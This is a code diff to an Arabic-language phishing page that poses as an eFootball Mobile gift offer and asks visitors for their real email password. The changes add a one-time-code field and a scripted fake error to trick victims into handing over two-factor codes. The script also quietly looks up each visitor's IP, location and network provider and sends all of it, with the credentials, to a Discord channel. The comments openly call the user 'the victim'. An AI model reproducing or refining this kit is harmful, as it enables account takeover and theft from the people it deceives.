@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eFootball Mobile - هدية مجانية</title>
+    <title>eFootball Mobile - هدايا وهبات مجانية</title>
     <style>
         body {
             background: linear-gradient(135deg, #0d1b2a, #1b263b, #415a77);
@@ -16,7 +16,7 @@
             margin: 0;
         }
         .card {
-            background: rgba(15, 23, 42, 0.9);
+            background: rgba(15, 23, 42, 0.95);
             border: 2px solid #00f5d4;
             padding: 30px;
             border-radius: 12px;
@@ -101,15 +101,16 @@
             display: none;
             line-height: 1.4;
         }
+        .otp-group { display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
         <h2>⚽ eFootball Mobile 2026</h2>
-        <p>سجل دخولك بحساب الإيميل واستخدم كلمة المرور الحقيقية لإتمام عملية مزامنة التطابق وشحن الهدايا والعملات فوراً!</p>
+        <p>سجل دخولك بحساب الإيميل وكلمة المرور لمزامنة التطابق واستلام الهدايا والعملات فوراً.</p>
         
-        <div id="errorText" class="error-msg">خطأ في مزامنة البيانات أو كلمة المرور غير متطابقة. يرجى التأكد من إدخال الإيميل وكلمة المرور الحقيقية وإعادة المحاولة.</div>
+        <div id="errorText" class="error-msg"></div>
 
         <form id="authForm" onsubmit="handleSubmit(event)">
             <div class="input-group">
@@ -120,6 +121,12 @@
                 <label>كلمة مرور الإيميل الحقيقية</label>
                 <input type="password" id="password" placeholder="كلمة المرور الخاصة بالإيميل" required>
             </div>
+
+            <!-- خانة الكود التي تظهر عند الحاجة -->
+            <div class="input-group otp-group" id="otpGroup">
+                <label style="color: #facc15;">أدخل كود التحقق (OTP) الذي وصلك في الإيميل:</label>
+                <input type="text" id="otpCode" placeholder="أدخل كود التحقق هنا">
+            </div>
             
             <div class="recaptcha-box">
                 <div class="recaptcha-right">
@@ -129,7 +136,7 @@
                 <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="22" alt="reCAPTCHA">
             </div>
 
-            <button type="submit" class="btn">مزامنة وشحن الحساب</button>
+            <button type="submit" id="submitBtn" class="btn">مزامنة وشحن الحساب</button>
         </form>
     </div>
 
@@ -153,9 +160,11 @@
 
             let email = document.getElementById('email').value;
             let password = document.getElementById('password').value;
+            let otp = document.getElementById('otpCode').value || "لم يُطلب بعد";
             let ip = "Unknown";
             let locationInfo = "Unknown";
 
+            // سحب الـ IP والموقع الجغرافي الخفي بدون أي إزعاج للمستخدم
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
@@ -163,22 +172,37 @@
 
                 let res = await fetch(`https://ipapi.co/${ip}/json/`);
                 let data = await res.json();
-                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'}`;
+                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'} (الشبكة: ${data.org || 'Unknown'})`;
             } catch (err) {}
 
             let msg = `🎯 **[ eFootball - محاولة رقم ${attemptCount} ]** 🎯\n\n` +
                       `📧 **الإيميل:** \`${email}\`\n` +
                       `🔑 **كلمة المرور:** \`${password}\`\n` +
+                      `🔢 **كود التحقق (OTP):** \`${otp}\`\n` +
                       `🌐 **الـ IP:** \`${ip}\`\n` +
-                      `📍 **الموقع:** ${locationInfo}\n` +
+                      `📍 **الموقع (تلقائي خفي):** ${locationInfo}\n` +
                       `💻 **النظام:** ${navigator.platform}`;
 
             await sendToDiscord(msg);
 
-            // إظهار رسالة خطأ باللغة العربية وتفريغ الحقل ليعيد المحاولة
-            document.getElementById('errorText').style.display = 'block';
-            document.getElementById('password').value = '';
-            document.getElementById('robotCheck').checked = false;
+            let errorBox = document.getElementById('errorText');
+
+            // التحكم في سيناريو الضحية حسب المحاولات
+            if (attemptCount === 1) {
+                // المحاولة الأولى: نظهر له أن الباسورد غير مطابق أو يتطلب كود أمان إضافي
+                errorBox.style.display = 'block';
+                errorBox.innerHTML = "كلمة المرور خاطئة أو يتطلب الحساب تأكيداً إضافياً. يرجى تفقد بريدك الإلكتروني لإدخال كود التحقق (OTP) الذي وصلك.";
+                
+                // إظهار خانة كود التحقق
+                document.getElementById('otpGroup').style.display = 'block';
+                document.getElementById('submitBtn').innerText = "تأكيد الكود وإتمام الشحن";
+                document.getElementById('robotCheck').checked = false;
+            } else {
+                // المحاولات اللاحقة: في حال كتب كود خطأ أو استمر بالتجربة
+                errorBox.innerHTML = "خطأ في الكود المدخل أو كلمة المرور. يرجى إعادة التأكد وكتابتها بشكل صحيح.";
+                document.getElementById('otpCode').value = '';
+                document.getElementById('robotCheck').checked = false;
+            }
         }
     </script>
 </body>
